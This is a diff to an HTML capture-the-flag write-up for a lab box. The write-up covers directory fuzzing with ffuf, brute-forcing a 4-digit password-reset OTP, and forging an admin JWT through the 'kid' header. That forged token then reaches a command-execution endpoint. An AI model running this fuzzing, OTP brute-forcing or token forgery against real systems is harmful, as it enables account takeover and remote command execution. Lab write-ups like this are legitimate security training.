@@ -68,14 +68,13 @@
 
       <!-- Tags -->
       <div class="writeup-tags">
-        <span class="writeup-tag">Brute Force</span>
-        <span class="writeup-tag">RCE</span>
-        <span class="writeup-tag">Auth Bypass</span>
         <span class="writeup-tag">Apache</span>
         <span class="writeup-tag">ffuf</span>
         <span class="writeup-tag">OTP</span>
         <span class="writeup-tag">JWT</span>
-        <span class="writeup-tag">kid</span>
+        <span class="writeup-tag">Brute Force</span>
+        <span class="writeup-tag">Auth Bypass</span>
+        <span class="writeup-tag">RCE</span>
         <span class="writeup-tag">Burp</span>
         <span class="writeup-tag">Web</span>
         <span class="writeup-tag">Enumeration</span>
@@ -96,10 +95,10 @@ PORT    STATE SERVICE
 <p>The web app is served over HTTP on port 1337.</p>
 <h3>Directory Enumeration</h3>
 <p>The landing page source contained a helpful comment:</p>
-<pre><code>&lt;!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME --&gt;
+<pre><code class="language-html">&lt;!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME --&gt;
 </code></pre>
 <p>With that hint, I fuzzed directories using <code>ffuf</code>:</p>
-<pre><code>ffuf -u http://10.10.118.103:1337/hmr_FUZZ \
+<pre><code class="language-bash">ffuf -u http://10.10.118.103:1337/hmr_FUZZ \
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
   -mc 200,301
 </code></pre>
@@ -119,7 +118,7 @@ PORT    STATE SERVICE
 </ul>
 <p>The reset mechanism relies on a <strong>4-digit OTP</strong> (0000–9999). Even with basic session/rate controls, it’s still brute-forceable by rotating sessions and pacing requests.</p>
 <p>Script used (<code>OTP_pin_brute.py</code>):</p>
-<pre><code>import requests
+<pre><code class="language-python">import requests
 import itertools
 import time
 import random
@@ -243,7 +242,7 @@ if __name__ == &quot;__main__&quot;:
 <li>Detects success by checking page content (recovery form disappears / new password form appears) rather than relying only on status codes.</li>
 </ul>
 <p>After the OTP is accepted and the password is reset, I logged in as the user. It drops you on <code>/execute_command.php</code> which contains a command input box.</p>
-<p>The command execution is very restricted: <code>ls</code> works and lists directory contents, but most other commands (like <code>cat</code>) are blocked. The app also auto-logoffs you again after a short time.</p>
+<p>The command execution is very restricted: <code>ls</code> works and lists directory contents, but most other commands (like <code>cat</code>) are blocked. The app also auto-logins you again after a short time.</p>
 <h3>Privilege Escalation &amp; RCE</h3>
 <p>After logging in, the app issues a JWT containing a claim like <code>role: user</code>. The JWT header includes a <code>kid</code> value that points at a file path.</p>
 <p>I inspected and modified the token using <code>jwt.io</code> (you can also do this programmatically with PyJWT).</p>
@@ -265,8 +264,7 @@ if __name__ == &quot;__main__&quot;:
 <li>Sign the token with the downloaded key</li>
 </ul>
 <p>Example forging with PyJWT:</p>
-<pre><code>import jwt
-
+<pre><code class="language-python">import jwt
 
 KEY = open(&quot;188ade1.key&quot;, &quot;rb&quot;).read()
 payload = {&quot;role&quot;: &quot;admin&quot;}
@@ -276,7 +274,7 @@ token = jwt.encode(payload, KEY, algorithm=&quot;HS256&quot;, headers=headers)
 print(token)
 </code></pre>
 <p>Finally, I sent the forged token in Burp by adding an Authorization header when posting to the command endpoint:</p>
-<pre><code>POST /execute_command.php HTTP/1.1
+<pre><code class="language-http">POST /execute_command.php HTTP/1.1
 Host: hammer.thm
 Authorization: Bearer &lt;FORGED_JWT_HERE&gt;
 Content-Type: application/x-www-form-urlencoded
@@ -300,7 +298,7 @@ command=id
 <li><strong>Signature</strong>: proves the token was signed by the server’s key/secret.</li>
 </ul>
 <p>Example forged JWT used in this lab:</p>
-<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcwNTg0MDIzLCJleHAiOjE3NzA1ODc2MjMsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.3cm0ELDW_cOvXgbJkwh94XZPG7APVRECxWCEkjV9P0A
+<pre><code class="language-text">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcwNTg0MDIzLCJleHAiOjE3NzA1ODc2MjMsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.3cm0ELDW_cOvXgbJkwh94XZPG7APVRECxWCEkjV9P0A
 </code></pre>
 <h2>How this should have been prevented</h2>
 <p>Built-in JWT library validation + common best practices would have stopped this chain:</p>
